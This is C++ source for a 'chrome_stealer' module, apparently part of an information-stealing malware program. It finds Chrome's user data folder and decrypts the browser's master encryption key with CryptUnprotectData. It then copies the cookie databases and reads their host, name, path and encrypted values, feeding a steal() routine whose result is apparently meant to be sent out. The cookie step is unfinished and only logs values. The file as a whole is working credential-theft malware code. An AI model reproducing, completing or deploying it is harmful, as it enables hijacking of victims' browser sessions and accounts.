#include "chrome_stealer.h"

#include <filesystem>
#include <fstream>
#include <shlobj_core.h>
#include <SQLiteCpp/SQLiteCpp.h>

#include "net.h"

#include "messages/text_message.h"
#include "messages/error_message.h"

#include <boost/beast/core/detail/base64.hpp>

#include <Wincrypt.h>

#define MY_ENCODING_TYPE  (PKCS_7_ASN_ENCODING | X509_ASN_ENCODING)

net::expected<fs::path> get_browser_path()
{
    TCHAR appdata_path[MAX_PATH];

    if(!SUCCEEDED(SHGetFolderPath(nullptr,
                                 CSIDL_LOCAL_APPDATA,
                                 nullptr,
                                 0,
                                 appdata_path)))
    {
        return net::error_t("Chrome(ERROR): Cant get path SHGetFolderPath");
    }

    return fs::path(appdata_path) / "Google" / "Chrome" / "User Data";
}

net::expected<std::vector<BYTE>> get_encryption_key(const fs::path& browser_path)
{
    fs::path local_state_path = browser_path / "Local State";

    std::ifstream local_state_file{};
    local_state_file.open(local_state_path.string(), std::ios::binary | std::ios::in);
    if(!local_state_file.is_open())
    {
        return net::error_t("Chrome(ERROR): cant get local state for chrome");
    }

    std::string content{
        std::istreambuf_iterator<char>(local_state_file),
        std::istreambuf_iterator<char>()};

    auto jcontent = json::parse(content);
    std::string encryption_key64 = jcontent.at("os_crypt").at("encrypted_key").as_string().c_str();

    std::vector<BYTE> encryption_key;
    encryption_key.resize(beast::detail::base64::decoded_size(encryption_key64.size()), 0);
    beast::detail::base64::decode(
        (void*)encryption_key.data(),
        encryption_key64.data(),
        encryption_key64.size());

    DATA_BLOB DataIn = { (DWORD)encryption_key.size() - 4, (BYTE*)encryption_key.data() + 4};
    DATA_BLOB DataOut = {0};
    LPWSTR pDescrOut = nullptr;
    if(!CryptUnprotectData(&DataIn,
        &pDescrOut,
        nullptr,
        nullptr,
        nullptr,
        0,
        &DataOut))
    {
        return net::error_t("Chrome(ERROR): cant encrypt encryption key");
    }

    std::vector<BYTE> to_ret(DataOut.pbData, DataOut.pbData + DataOut.cbData);

    LocalFree(DataOut.pbData);

    return to_ret;
}

net::expected<std::vector<net::cookie_t>> get_cookies(const fs::path& browser_path)
{
    const auto cookies_path = browser_path / "Default";
    if(!fs::exists(cookies_path))
        return net::error_t("Chrome(ERROR): cookies folder not found");

    for (const auto& cookie_path : fs::recursive_directory_iterator(cookies_path))
    {
        if(!cookie_path.is_regular_file())
            continue;

        fs::path temp_cookie_file_path;
        do
        {
            temp_cookie_file_path = net::get_temp_unique_file_path();
        } while(fs::exists(temp_cookie_file_path));

        try
        {
            fs::copy_file(cookie_path, temp_cookie_file_path);
            FS_DEFER([&](...){
                fs::remove(temp_cookie_file_path);
            });

            SQLite::Database db(temp_cookie_file_path, SQLite::OPEN_READONLY);

            if(!db.tableExists("cookies"))
                continue;

            DLOG(std::format("Chrome(DISPLAY): file with cookie {}", cookie_path.path().string()));

            SQLite::Statement query{db, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies;"};

            while(query.executeStep())
            {
                const auto host_key = query.getColumn(0).getString();
                const auto name = query.getColumn(1).getString();
                const auto path = query.getColumn(2).getString();
                auto encrypted_cookie = (const BYTE*)query.getColumn(3).getBlob();
                auto encrypted_cookie_size = query.getColumn(3).getBytes();
                const auto expiry = query.getColumn(4).getUInt();

                DLOG(std::format("Chrome(DISPLAY): {} {} {} {}", host_key, name, path, expiry));
            }
        } catch (SQLite::Exception& ex)
        {
            if(ex.getErrorCode() != 26)
                DLOG(std::format("Chrome(ERROR): {} {}", ex.getErrorCode(), ex.what()));
            continue;
        } catch (...)
        {
            continue;
        }
    }

    return net::error_t("Chrome(ERROR): Cant get cookies");
}

asio::awaitable<std::unique_ptr<message_t>> chrome_stealer_t::steal()
{
        return asio::async_initiate<decltype(asio::use_awaitable), void(std::unique_ptr<message_t>&&)>(
        [](auto completion_handler)
        {
            std::thread([](auto completion_handler)
            {
                FS_TRY_EXPECTED_OR_RETURN_ERROR_MESSAGE(auto browser_path, get_browser_path());

                FS_TRY_EXPECTED_OR_RETURN_ERROR_MESSAGE(auto encryption_key, get_encryption_key(browser_path));
                DLOG("Chrome(DISPLAY): Encryption key received");

                FS_TRY_EXPECTED_OR_RETURN_ERROR_MESSAGE(auto cookies, get_cookies(browser_path));
                DLOG("Chrome(DISPLAY): Cookies received");

                auto text_msg = std::make_unique<text_message_t>();
                text_msg->text = "";
                std::move(completion_handler)(std::move(text_msg));
            }, std::move(completion_handler)).detach();
        }, asio::use_awaitable
    );
}
